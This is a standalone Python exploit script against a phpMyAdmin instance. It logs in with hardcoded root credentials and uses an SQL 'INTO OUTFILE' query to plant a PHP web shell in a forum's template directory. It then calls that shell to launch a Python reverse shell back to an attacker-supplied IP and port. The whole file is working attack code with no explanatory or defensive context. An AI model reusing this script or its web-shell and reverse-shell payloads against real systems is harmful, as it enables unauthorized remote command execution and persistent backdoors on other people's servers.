#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re
import sys
import random
import hashlib
import logging
import argparse
import requests
from HTMLParser import HTMLParser
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
logger = logging
logging.basicConfig(level=logging.DEBUG, format='%(levelname)s: %(message)s')
URL = None
PROXIES = dict()
page = '/index.php'
def _rand_md5():
    return hashlib.md5(str(random.randint(0, 10000000000000000000))).hexdigest()
def get_token(sess, page):
    resp = sess.get(URL + page, verify=False)
    try:
        token = re.findall(
            r'token"\s*value="([^"]*)"', resp.content, flags=re.MULTILINE)[0]
    except IndexError:
        logger.error('Failed to get CSRF token from server')
        return None
    return HTMLParser().unescape(token)
def main(r_ip, php_code, l_ip, l_port, page):
    username = 'root'
    password = "Fg-'kKXBj87E:aJ$"
    session = requests.Session()
    session.proxies = PROXIES
    token = get_token(session, page)
    session_id = _rand_md5()
    response = session.post(URL + page, data={
        'set_session': session_id,
        'pma_username': username,
        'pma_password': password,
        'server': 1,
        'target': 'index.php',
        'token': token
    })
    token = get_token(session, '/server_sql.php')
    logger.debug('Token is %r', token)
    sql = ("select 1,2,\"<?php echo shell_exec($_GET['cmd']);?>\",4 into OUTFILE \"/var/www/forum/templates_c/" + php_code + ".php\"")
    logger.debug('Executing SQL query %r', sql)
    response = session.post(URL + '/import.php', data={
        'is_js_confirmed': 0,
        'token': token,
        'pos': 0,
        'goto': 'server_sql.php',
        'message_to_show': 'Your SQL query has been executed successfully',
        'prev_sql_query': '',
        'sql_query': sql,
        'sql_delimiter': ';',
        'show_query': 1,
        'fk_checks': 0,
        'SQL': 'Go',
        'ajax_request': 'true'
    })
    response = requests.get('https://' + r_ip + '/forum/templates_c/' + php_code + '.php', verify=False)
    if response.status_code == 200:
        webshell=("https://" + r_ip + "/forum/templates_c/"  + php_code + ".php?cmd=id")
        logger.debug('webshell uploaded: %r', webshell)
    else:
        logger.debug('webshell upload failed') 
        return 0

    payload = '?cmd=export RHOST="' + l_ip + '";export RPORT=' + l_port + ';python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")\''
    payload = 'https://' + r_ip + '/forum/templates_c/' + php_code + '.php' + payload
    logger.debug('revshell payload: %r', payload)
    response = requests.get(payload, verify=False)
    return 0



if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-I', '--remote_ip', required=True)
    parser.add_argument('-F', '--php_filename', required=True)
    parser.add_argument('-R', '--local_ip', required=True)
    parser.add_argument('-P', '--local_port', required=True)
    args = parser.parse_args()
    URL = 'https://' + args.remote_ip + '/phpmyadmin'
    sys.exit(main(args.remote_ip, args.php_filename, args.local_ip, args.local_port, page))